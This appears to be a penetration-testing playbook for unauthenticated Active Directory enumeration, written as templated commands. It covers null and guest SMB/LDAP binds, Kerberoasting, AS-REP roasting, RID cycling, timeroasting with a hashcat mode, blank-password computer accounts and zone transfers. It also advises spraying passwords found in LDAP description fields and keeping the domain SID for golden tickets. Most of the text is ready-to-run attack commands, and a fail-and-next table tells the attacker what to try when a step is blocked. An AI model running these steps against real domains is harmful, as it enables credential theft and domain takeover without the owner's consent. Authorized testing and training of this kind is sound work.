# Unauth / offline enum (senior)

Before a password exists. Goal: `users.txt` and a domain SID.

## When / not

Use when: nxc null/guest is unknown, or you need RID/LDAP offline dumps.
Stop once you have a cred — switch to BloodHound + nxc authenticated.

## Tools

```
# nxc first — try null AND guest. empty password is first-class, not an error.
nxc smb {{DC}} -u '' -p '' --users --shares
nxc smb {{DC}} -u guest -p '' --shares            # null often denied while guest binds
nxc ldap {{DC}} -u guest -p '' --users            # guest → LDAP → BloodHound
# guest works? Kerberoast immediately, before any spray:
impacket-GetUserSPNs {{DOMAIN}}/guest -no-pass -dc-ip {{DC}} -request
nxc ldap {{DC}} -u '' -p '' --users --active-users --asreproast /loot/hashes/asrep.txt

enum4linux-ng -A {{DC}}

impacket-lookupsid {{DOMAIN}}/nobody@{{DC}} -no-pass
impacket-lookupsid {{DOMAIN}}/nobody@{{DC}} -no-pass -max-rid 4000

ldapsearch -x -H ldap://{{DC}} -s base namingContexts
ldapsearch -x -H ldap://{{DC}} -b '{{NC}}' '(objectClass=user)' sAMAccountName description

# once you have ANY cred — offline dump
ldeep ldap -u {{USER}} -p '{{PASS}}' -d {{DOMAIN}} -s ldap://{{DC}} all /loot/enum/ldeep
ldapdomaindump -u '{{DOMAIN}}\\{{USER}}' -p '{{PASS}}' {{DC}} -o /loot/enum/ldd

dig axfr {{DOMAIN}} @{{NS}}
nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 {{DC}}

# pre2k computer accounts (blank password)
nxc smb {{DC}} -u computers.txt -p '' --no-bruteforce --continue-on-success
# timeroast (no cred)
nxc smb {{DC}} --timeroasting /loot/hashes/timeroast.txt
# hashcat -m 31300 timeroast.txt

```

## High latency / VPN — LDAP first, not RID-brute

On a slow link (VPN, ~250ms RTT) NetExec's chatty per-RID lookups time out
(`NetBIOSTimeout`). Anonymous/guest LDAP pulls the whole directory in a few big
queries instead. If null/guest binds, prefer these:

```
# every user + description in one query (harvest creds from description/info)
ldapsearch -x -H ldap://{{DC}} -b '{{NC}}' '(objectClass=user)' \
  sAMAccountName description info userPrincipalName
# AS-REP-roastable (DONT_REQ_PREAUTH bit)
ldapsearch -x -H ldap://{{DC}} -b '{{NC}}' \
  '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName
# Kerberoastable (any SPN)
ldapsearch -x -H ldap://{{DC}} -b '{{NC}}' '(servicePrincipalName=*)' \
  sAMAccountName servicePrincipalName
# clock (rootDSE currentTime) — also confirms Kerberos won't skew
ldapsearch -x -H ldap://{{DC}} -s base '' currentTime
# guest-authenticated variant when anonymous is limited
ldapsearch -x -H ldap://{{DC}} -D 'guest@{{DOMAIN}}' -w '' -b '{{NC}}' '(objectClass=user)' sAMAccountName
```

Build `users.txt` from the `sAMAccountName:` lines; feed the roastable/SPN lists
straight into `GetNPUsers` / `GetUserSPNs`.

## Read this

- `namingContexts` tells you every NC (config, schema, domain). You want the domain DN.
- `description` / `info` / `userPassword` in LDAP are creds more often than juniors expect. Spray those strings against their owners (`automation.md` already does this).
- lookupsid `500` is Administrator. The domain SID is everything left of `-500`. You need it for ticketer.
- AXFR works on neglected labs. Hosts become the CIDR.
- **guest with an empty password is a real foothold.** Null bind can be denied
  while `guest -p ''` binds. Do not RID-brute + AS-REP + spray for rounds when
  guest already gives you LDAP + Kerberoast (`-no-pass`). Roast first (Operation Endgame).

## Fail → next

| Symptom | Next |
| --- | --- |
| null denied, guest not tried | `-u guest -p ''` — empty pw is first-class. Then LDAP + Kerberoast `-no-pass` |
| `STATUS_ACCESS_DENIED` on null and guest | RID cycle. then poison if L2, else wait for a brief/web cred |
| lookupsid `ERROR_ACCESS_DENIED` | need any valid bind. AS-REP with an empty user list will fail too |
| ldapsearch sizeLimit | `-E pr=1000/noprompt` or ldeep |
| no 88/389 on the IP | that is a member. keep sweeping |
| AXFR refused | normal. ignore |

## Chain

users.txt → AS-REP + user=pass + descriptions. SID stashed for later golden/extra-SID.
Authenticated dump (ldeep / ldd) is for grepping offline, not a substitute for BloodHound paths.
